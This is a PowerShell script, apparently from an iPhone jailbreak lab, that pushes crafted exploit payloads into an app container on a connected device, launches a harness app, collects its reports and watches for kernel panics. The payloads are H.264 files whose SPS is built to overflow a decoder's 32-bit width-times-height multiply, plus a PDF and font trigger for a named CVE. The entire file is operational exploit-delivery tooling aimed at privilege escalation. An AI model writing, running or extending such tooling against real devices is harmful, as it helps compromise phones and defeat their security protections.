# o_c_fire.ps1 - fire every staged payload at the device and collect the results.
#
# For each payload: push it into the app's container under its own name, launch
# the harness with CG_FILE pointed at it, then pull the report. A payload that
# trips a kernel bug shows up as the process dying mid-report, the device
# rebooting, or a kernel panic in the crash store.
#
# Run:  powershell -NoProfile -ExecutionPolicy Bypass -File o_c_fire.ps1
$ErrorActionPreference = 'Continue'
$wd    = "G:\op lab\iphone-control\jailbreak"
$ios   = "G:\op lab\arsenal\ios-mirror\bin\ios.exe"
$ch    = "$wd\.o_c\channel"
$bid   = "com.lab.lpe.2BGBD62KA3"
$out   = "$wd\.o_c\fire_results.txt"

if (Test-Path $out) { Remove-Item $out }

# kernel leg first: the crafted H.264 ladder (SPS claims 4097x4097 MBs so the
# decoder's 32-bit width*height multiply wraps to 2,097,408)
$payloads = @()
Get-ChildItem "$ch\oc_*.h264" -ErrorAction SilentlyContinue | ForEach-Object {
    $payloads += @{ local = $_.FullName; name = $_.Name }
}
# userland leg: the califio CVE-2026-86950 trigger (crafted PDF + its TTF)
$cg = "$wd\loot\califio-publications\MADBugs\CVE-2026-86950\trigger"
if (Test-Path "$cg\trigger.pdf") {
    $payloads += @{ local = "$cg\trigger.pdf"; name = "cg_trigger.pdf" }
    & $ios file push --app=$bid --local="$cg\trigger.ttf" --remote="Documents/trigger.ttf" *> $null
}

foreach ($p in $payloads) {
    Write-Host "=== firing $($p.name) ==="
    & $ios file push --app=$bid --local=$($p.local) --remote="Documents/$($p.name)" *> $null
    Start-Sleep -Seconds 2
    pymobiledevice3 developer dvt launch --env "CG_FILE=$($p.name)" $bid 2>&1 |
        Select-String -Pattern "launched|Error" | Select-Object -First 2 | ForEach-Object { $_.Line }
    Start-Sleep -Seconds 9
    $rep = "$wd\.o_c\fire_report.txt"
    if (Test-Path $rep) { Remove-Item $rep }
    & $ios file pull --app=$bid --remote="Documents/cg_report.txt" --local=$rep *> $null
    if (Test-Path $rep) {
        $txt = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($rep))
        Add-Content -LiteralPath $out -Value "--- $($p.name) ---`n$txt" -Encoding UTF8
        $tail = ($txt -split "`n" | Select-Object -Last 4) -join " | "
        Write-Host "    report tail: $tail"
    } else {
        Add-Content -LiteralPath $out -Value "--- $($p.name) --- NO REPORT (the process died)" -Encoding UTF8
        Write-Host "    NO REPORT - the process died on this payload"
    }
    # is the device still alive?
    $alive = (& $ios info 2>&1 | Select-String -Pattern "ProductVersion" | Select-Object -First 1)
    if (-not $alive) { Write-Host "    DEVICE GONE (kernel panic?) - stopping"; break }
}

Write-Host ""
Write-Host "=== crash store (newest) ==="
& $ios crash ls 2>&1 | Select-Object -First 1 | ForEach-Object { $_.Line.Substring(0, [Math]::Min(700, $_.Line.Length)) }
Write-Host ""
Write-Host "=== results in $out ==="
Get-Content $out -ErrorAction SilentlyContinue | Select-Object -Last 40
